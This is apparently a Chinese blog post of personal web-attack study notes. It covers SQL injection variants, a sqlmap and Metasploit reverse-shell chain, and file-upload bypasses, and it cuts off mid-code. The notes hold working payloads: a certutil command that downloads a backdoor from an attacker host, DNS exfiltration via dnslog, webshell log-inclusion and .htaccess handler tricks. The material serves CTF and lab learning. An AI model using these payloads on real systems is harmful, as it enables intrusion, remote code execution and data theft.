{"title":"WEB攻防-通用漏洞","uid":"11932efbcdc3039b003ba34e280dee13","slug":"WEB攻防-通用漏洞","date":"2024-03-05T15:07:08.000Z","updated":"2024-04-21T12:31:45.059Z","comments":true,"path":"api/articles/WEB攻防-通用漏洞.json","keywords":null,"cover":null,"content":"<h1 id=\"WEB攻防-通用漏洞\"><a href=\"#WEB攻防-通用漏洞\" class=\"headerlink\" title=\"WEB攻防-通用漏洞\"></a>WEB攻防-通用漏洞</h1><p>大型靶场<a href=\"https://vulhub.org/#/environments/\">Vulhub - Docker-Compose file for vulnerability environment</a></p>\n<h2 id=\"SQL注入-补充内容\"><a href=\"#SQL注入-补充内容\" class=\"headerlink\" title=\"SQL注入-补充内容\"></a>SQL注入-补充内容</h2><h3 id=\"ACCESS注入\"><a href=\"#ACCESS注入\" class=\"headerlink\" title=\"ACCESS注入\"></a>ACCESS注入</h3><h4 id=\"偏移注入\"><a href=\"#偏移注入\" class=\"headerlink\" title=\"偏移注入\"></a>偏移注入</h4><h5 id=\"使用场景\"><a href=\"#使用场景\" class=\"headerlink\" title=\"使用场景\"></a>使用场景</h5><ul>\n<li>知道表名</li>\n<li>不知道列名</li>\n<li>列名特殊, 无法爆破</li>\n</ul>\n<h5 id=\"注入原理\"><a href=\"#注入原理\" class=\"headerlink\" title=\"注入原理\"></a>注入原理</h5><ul>\n<li><p>假设一个表有8个字段，admin表有3个字段。(需要先判断列数)</p>\n</li>\n<li><p>联合查询payload：union select 1,2,3,4,5,6,7,8 from admin </p>\n</li>\n<li><p>在我们不知道admin有多少字段的情况下可以尝试payload：union select 1,2,3,4,5,6,7,admin.* from admin，此时页面出错</p>\n</li>\n<li><p>直到payload：union select 1,2,3,4,5,admin.* from admin时页面返回正常，说明admin表有三个字段</p>\n</li>\n<li><p>然后通过移动admin.*的位置，就可以回显不同的数据</p>\n</li>\n</ul>\n<h3 id=\"MYSQL\"><a href=\"#MYSQL\" class=\"headerlink\" title=\"MYSQL\"></a>MYSQL</h3><ul>\n<li><p>读取文件</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">select load_file(&#39;D:/a.txt&#39;);</span></span></code></pre></div></li>\n<li><p>写入文件</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">select &#39;xxxx&#39; into outfile &#39;D:/a.txt&#39;;</span></span></code></pre></div></li>\n</ul>\n<h3 id=\"sqlmap\"><a href=\"#sqlmap\" class=\"headerlink\" title=\"sqlmap\"></a>sqlmap</h3><ul>\n<li><a href=\"https://www.cnblogs.com/bmjoker/p/9326258.html\">1. sqlmap超详细笔记+思维导图 - bmjoker - 博客园 (cnblogs.com)</a></li>\n</ul>\n<h4 id=\"sqlmap联动msf\"><a href=\"#sqlmap联动msf\" class=\"headerlink\" title=\"sqlmap联动msf\"></a>sqlmap联动msf</h4><ul>\n<li><p>攻击者服务器msf生成后门</p>\n<div class=\"language-bash\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">bash</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #FFCB6B\">msfvenom</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">-p</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">windows/meterpreter/reverse_http</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">lhost=服务器地址</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">lport=端口</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">-f</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">exe</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">-o</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">sql.exe</span></span></code></pre></div></li>\n<li><p>开启监听：</p>\n<div class=\"language-bash\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">bash</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #FFCB6B\">msf6&gt;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">use</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">exploit/multi/handler</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">msf6&gt;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">set</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">lhost</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0.0</span><span style=\"color: #C3E88D\">.0.0</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">msf6&gt;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">set</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">lport</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">6666</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">msf6&gt;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">run</span></span></code></pre></div></li>\n<li><p>sqlmap实现访问下载后门文件</p>\n<div class=\"language-bash\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">bash</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #FFCB6B\">python</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">sqlmap.py</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">-u</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">url</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">--os-cmd=</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">certutil -urlcache -split -f http://xxxx/sql.exe c:/sql.exe</span><span style=\"color: #89DDFF\">&quot;</span></span></code></pre></div></li>\n</ul>\n<h4 id=\"脚本使用\"><a href=\"#脚本使用\" class=\"headerlink\" title=\"脚本使用\"></a>脚本使用</h4><p>工具无法自动判断加密&#x2F;编码类型和数据格式(如json), 需要手工注入进行判断</p>\n<ul>\n<li>例如, 用base64编码payload:<div class=\"language-bash\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">bash</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #FFCB6B\">python</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">sqlmap.py</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">-u</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">url</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">--tamper=base64encode.py</span></span></code></pre></div></li>\n</ul>\n<h4 id=\"基于堆叠注入-绕过select过滤\"><a href=\"#基于堆叠注入-绕过select过滤\" class=\"headerlink\" title=\"(基于堆叠注入)绕过select过滤\"></a>(基于堆叠注入)绕过select过滤</h4><p><a href=\"https://www.cnblogs.com/cmredkulaa/p/14563311.html\">几种绕过select过滤的姿势 - 2hangG3 - 博客园 (cnblogs.com)</a></p>\n<ul>\n<li><p>原语句:</p>\n<div class=\"language-sql\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">sql</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #F78C6C\">1</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">;select flag from `1919810931114514`;</span></span></code></pre></div></li>\n<li><p>由于<code>return preg_match(&quot;/select|update|delete|drop|insert|where|\\./i&quot;,$inject);</code>select被过滤</p>\n</li>\n<li><p>改为:</p>\n<div class=\"language-sql\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">sql</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #F78C6C\">1</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">;set @sql = CONCAT(</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #BABED8\">se</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">,</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #BABED8\">lect </span><span style=\"color: #89DDFF\">*</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">from</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">`</span><span style=\"color: #C3E88D\">1919810931114514</span><span style=\"color: #89DDFF\">`</span><span style=\"color: #BABED8\">;</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">);prepare stmt from @sql;EXECUTE stmt;</span></span></code></pre></div></li>\n<li><p>解析:</p>\n<ul>\n<li><div class=\"language-sql\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">sql</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #F78C6C\">sEt</span><span style=\"color: #BABED8\"> @sql </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">CONCAT</span><span style=\"color: #BABED8\">(</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">se</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #BABED8\">,</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">lect * from `1919810931114514`;</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #BABED8\">);</span></span></code></pre></div><ul>\n<li><code>set</code>用于设置变量名和值</li>\n<li><code>CONCAT</code><strong>拼接语句, 绕过过滤</strong></li>\n</ul>\n</li>\n<li><div class=\"language-sql\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">sql</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #BABED8\">prepare stmt </span><span style=\"color: #F78C6C\">from</span><span style=\"color: #BABED8\"> @sql;</span></span></code></pre></div><p><code>prepare</code>用于预备一个语句，并赋予名称，以后可以引用该语句</p>\n</li>\n<li><div class=\"language-sql\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">sql</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"></span></code></pre></div></li>\n</ul>\n<p>  EXECUTE stmt;</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\"></span></span>\n<span class=\"line\"><span style=\"color: #babed8\">`execute`执行语句</span></span></code></pre></div></li>\n</ul>\n<h3 id=\"二次注入\"><a href=\"#二次注入\" class=\"headerlink\" title=\"二次注入\"></a>二次注入</h3><h5 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h5><ul>\n<li>普通注入: 数据直接进入到 SQL 查询中</li>\n<li>二次注入: 输入数据经处理后<strong>存储</strong>, 取出后, <strong>再次</strong>进入到 SQL 查询</li>\n</ul>\n<h5 id=\"过程\"><a href=\"#过程\" class=\"headerlink\" title=\"过程\"></a>过程</h5><ul>\n<li>插入<code>1‘#</code></li>\n<li>被转义成<code>1\\’#</code></li>\n<li>不能注入，但是<strong>保存在数据库</strong>时变成了原来的<code>1’#</code></li>\n<li>利用<code>1’#</code>进行注入,这里利用时要求取出数据时不转义</li>\n</ul>\n<h5 id=\"案例\"><a href=\"#案例\" class=\"headerlink\" title=\"案例\"></a>案例</h5><p><a href=\"https://buuoj.cn/challenges#[%E7%BD%91%E9%BC%8E%E6%9D%AF2018]Unfinish\">网鼎杯2018-Unfinish</a></p>\n<ul>\n<li>注册时在<code>username</code>注入sql语句</li>\n<li>此时数据被转义, <strong>无法注入</strong></li>\n<li>利用邮箱登录后重新加载<code>username</code>, 此时没有转义, 注入语句成功执行</li>\n</ul>\n<h3 id=\"DNS注入\"><a href=\"#DNS注入\" class=\"headerlink\" title=\"DNS注入\"></a>DNS注入</h3><ul>\n<li>DNS协议：将域名转化为IP 日志 &#x3D;&gt; 记录了域名转化IP请求</li>\n</ul>\n<p><em><strong>DNS注入的核心，将盲注转化为显错注入</strong></em></p>\n<ul>\n<li>payload例子:</li>\n</ul>\n<div class=\"language-sql\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">sql</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #F78C6C\">select</span><span style=\"color: #BABED8\"> load_file(</span><span style=\"color: #82AAFF\">concat</span><span style=\"color: #BABED8\">(</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">//</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #BABED8\">,(</span><span style=\"color: #F78C6C\">select</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">database</span><span style=\"color: #89DDFF\">()</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">limit</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0</span><span style=\"color: #BABED8\">,</span><span style=\"color: #F78C6C\">1</span><span style=\"color: #BABED8\">),</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">.81k8pu.dnslog.cn/abc</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #BABED8\">));</span></span></code></pre></div><h2 id=\"文件上传\"><a href=\"#文件上传\" class=\"headerlink\" title=\"文件上传\"></a>文件上传</h2><p>靶场: <a href=\"https://github.com/c0ny1/upload-labs\">c0ny1&#x2F;upload-labs: 一个想帮你总结所有类型的上传漏洞的靶场 (github.com)</a></p>\n<p>推荐文章: <a href=\"https://zhuanlan.zhihu.com/p/631648316\">一文爽 文件上传漏洞原理、方法和类型详细解析 - 知乎 (zhihu.com)</a></p>\n<h3 id=\"黑白盒测试\"><a href=\"#黑白盒测试\" class=\"headerlink\" title=\"黑白盒测试\"></a>黑白盒测试</h3><h4 id=\"黑盒\"><a href=\"#黑盒\" class=\"headerlink\" title=\"黑盒\"></a>黑盒</h4><p><strong>寻找一切存在文件上传的功能应用</strong></p>\n<ol>\n<li>个人用户中心是否存在文件上传功能</li>\n<li>后台管理系统是否存在文件上传功能</li>\n<li>字典目录扫描探针文件上传构造地址</li>\n<li>字典目录扫描探针编辑器目录构造地址</li>\n</ol>\n<h4 id=\"白盒\"><a href=\"#白盒\" class=\"headerlink\" title=\"白盒\"></a>白盒</h4><p><strong>看三点，中间件，编辑器，功能代码</strong></p>\n<ol>\n<li>中间件直接看语言环境常见搭配</li>\n<li>编辑器直接看目录机构或搜索关键字</li>\n<li>功能代码直接看源码应用或搜索关键字</li>\n</ol>\n<h3 id=\"解析执行\"><a href=\"#解析执行\" class=\"headerlink\" title=\"解析执行\"></a>解析执行</h3><h4 id=\"user-ini\"><a href=\"#user-ini\" class=\"headerlink\" title=\".user.ini\"></a>.user.ini</h4><ul>\n<li>可以上传一个.user,ini文件, 自定义以php解析特定文件, 例如<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">auto_prepend_file=test.txt</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">//或者</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">auto_append_file=test.txt</span></span></code></pre></div></li>\n</ul>\n<h4 id=\"htaccess\"><a href=\"#htaccess\" class=\"headerlink\" title=\".htaccess\"></a>.htaccess</h4><h5 id=\"原理-1\"><a href=\"#原理-1\" class=\"headerlink\" title=\"原理\"></a>原理</h5><ul>\n<li>.htaccess文件是Apache服务器中的一个配置文件</li>\n<li>.apache配置文件为AllowOverride All(默认为None)</li>\n</ul>\n<h5 id=\"条件\"><a href=\"#条件\" class=\"headerlink\" title=\"条件\"></a>条件</h5><ul>\n<li>Apache开启rewrite模块</li>\n</ul>\n<h5 id=\"示例\"><a href=\"#示例\" class=\"headerlink\" title=\"示例\"></a>示例</h5><div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">&lt;FilesMatch&quot;x.png&quot;&gt;</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">SetHandlerapplication/x-httpd-php</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">&lt;/FilesMatch&gt;</span></span></code></pre></div><ul>\n<li>x.png是代码将该目录下文件叫x.png的文件以php进行执行</li>\n<li>上传.htaccess，上传一张名叫x.png的文件，即可执行</li>\n</ul>\n<h3 id=\"过滤绕过\"><a href=\"#过滤绕过\" class=\"headerlink\" title=\"过滤绕过\"></a>过滤绕过</h3><h4 id=\"绕过过滤\"><a href=\"#绕过过滤\" class=\"headerlink\" title=\"绕过&lt;?php?&gt;过滤\"></a>绕过&lt;?php?&gt;过滤</h4><ul>\n<li><code>&lt;?   ?&gt;</code>需要开启短标签开关，short_open_tag</li>\n<li><code>&lt;?= ?&gt;</code>PHP版本&gt;PHP 5.4.0</li>\n<li><code>&lt;% %&gt;</code>asp_tags设成On</li>\n<li><code>&lt;script language=&quot;php&quot;&gt;&lt;/script&gt;</code>php7之后就不能用了</li>\n</ul>\n<h4 id=\"利用反引号-绕过\"><a href=\"#利用反引号-绕过\" class=\"headerlink\" title=\"利用反引号&#96;&#96;绕过\"></a>利用反引号&#96;&#96;绕过</h4><ul>\n<li>反引号运算符”&#96;”相当于 “shell_exec() “函数, 将里面的内容作为shell命令来执行</li>\n</ul>\n<h4 id=\"包含日志\"><a href=\"#包含日志\" class=\"headerlink\" title=\"包含日志\"></a>包含日志</h4><ul>\n<li><p>将后门代码写入UA头中</p>\n</li>\n<li><p>写入.user.ini配置文件，将日志文件内容通过文件包含访问</p>\n</li>\n<li><p>例如:</p>\n<p><code>user.ini:auto_prepend_file-test.png</code><br><code>test.png:&lt;?=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt;</code></p>\n</li>\n</ul>\n<h4 id=\"短网址绕过”-”\"><a href=\"#短网址绕过”-”\" class=\"headerlink\" title=\"短网址绕过”.”\"></a>短网址绕过”.”</h4><ul>\n<li>在需要远程文件包含, 但过滤了点号<code>.</code>时, 可以使用短链接</li>\n<li>比如<code>http://47.94.236.117/</code>转换为<code>http://794750069/</code>就可以绕过过滤</li>\n</ul>\n<h3 id=\"文件头检测\"><a href=\"#文件头检测\" class=\"headerlink\" title=\"文件头检测\"></a>文件头检测</h3><ul>\n<li><p>文件头部检测是否为图片格式文件, 如图像会检测头部是否为<code>GIF89a</code></p>\n</li>\n<li><h2 id=\"可在文件头部添加该特征绕过检测-例如-user-ini-GIF89Aauto-prepend-file-test-png\"><a href=\"#可在文件头部添加该特征绕过检测-例如-user-ini-GIF89Aauto-prepend-file-test-png\" class=\"headerlink\" title=\"可在文件头部添加该特征绕过检测, 例如&#96;&#96;&#96;user ini:GIF89Aauto_prepend_file&#x3D;test.png\"></a>可在文件头部添加该特征绕过检测, 例如<br>&#96;&#96;&#96;<br>user ini:<br>GIF89A<br>auto_prepend_file&#x3D;test.png</h2><p>test.png:<br>GIF89A</p>\n<?=include\"/var/lo\".\"g/nginx/access.lo\".\"g\"?>\n</li>\n<li><p><a href=\"https://www.cnblogs.com/WangAoBo/p/6366211.html\">常见文件的文件头标志 - M4x - 博客园 (cnblogs.com)</a></p>\n</li>\n</ul>\n<h3 id=\"条件竞争\"><a href=\"#条件竞争\" class=\"headerlink\" title=\"条件竞争\"></a>条件竞争</h3><p><a href=\"https://blog.csdn.net/weixin_45588247/article/details/118796606?spm=1001.2014.3001.5501\">【文件上传绕过】——条件竞争漏洞-CSDN博客</a></p>\n<h4 id=\"漏洞原理\"><a href=\"#漏洞原理\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h4><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>服务器端在处理不同用户的请求时是并发进行的，因此，如果<strong>并发处理不当</strong>或相关<strong>操作逻辑顺序</strong>设计的不合理时，将会导致此类问题的发生</p>\n<p>例如:</p>\n<ul>\n<li>上传文件源代码里没有校验上传的文件</li>\n<li>上传成功后才进行判断</li>\n<li>如果文件格式符合要求，则重命名，如果文件格式不符合要求，将文件删除</li>\n</ul></blockquote>\n<h4 id=\"利用\"><a href=\"#利用\" class=\"headerlink\" title=\"利用\"></a>利用</h4><ul>\n<li>营造10000人同时上传文件1.php的情境, 另外有10000人在同时访问这个1.php</li>\n<li>上传文件时，这个文件会有<strong>一段时间</strong>留存在服务器的上传目录下</li>\n<li>而服务器脚本在进行判断文件是否合法而对文件进行删除时，会有<strong>一定的处理时间</strong></li>\n<li>可能在某个时间里，<strong>服务器还未来得及删除文件</strong>,</li>\n<li>此时利用1.php<strong>重新生成</strong>一个php文件</li>\n</ul>\n<h3 id=\"二次渲染\"><a href=\"#二次渲染\" class=\"headerlink\" title=\"二次渲染\"></a>二次渲染</h3><p><a href=\"https://blog.csdn.net/qq_40800734/article/details/105920149\">文件上传之二次渲染绕过_二次渲染绕过怎么操作-CSDN博客</a></p>\n<p><a href=\"https://blog.csdn.net/weixin_45588247/article/details/119177948\">【文件上传绕过】——二次渲染漏洞_二次渲染绕过-CSDN博客</a></p>\n<h4 id=\"二次渲染原理\"><a href=\"#二次渲染原理\" class=\"headerlink\" title=\"二次渲染原理\"></a>二次渲染原理</h4><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p> 在我们上传文件后，网站会对图片进行二次处理（格式、尺寸要求等），服务器会根据我们原有的图片<strong>生成</strong>一个<strong>新的图片</strong>并放到网站对应的标签进行显示。</p></blockquote>\n<h4 id=\"识别\"><a href=\"#识别\" class=\"headerlink\" title=\"识别\"></a>识别</h4><ul>\n<li>检查上传前后图片文件大小是否更改</li>\n</ul>\n<h4 id=\"绕过\"><a href=\"#绕过\" class=\"headerlink\" title=\"绕过\"></a>绕过</h4><ul>\n<li>使用脚本生成图片马, 例如:<div class=\"language-php\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">php</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #89DDFF\">&lt;?</span><span style=\"color: #BABED8\">php</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">$</span><span style=\"color: #BABED8\">p </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">array</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #F78C6C\">0xa3</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x9f</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x67</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0xf7</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x0e</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x93</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x1b</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x23</span><span style=\"color: #89DDFF\">,</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">           </span><span style=\"color: #F78C6C\">0xbe</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x2c</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x8a</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0xd0</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x80</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0xf9</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0xe1</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0xae</span><span 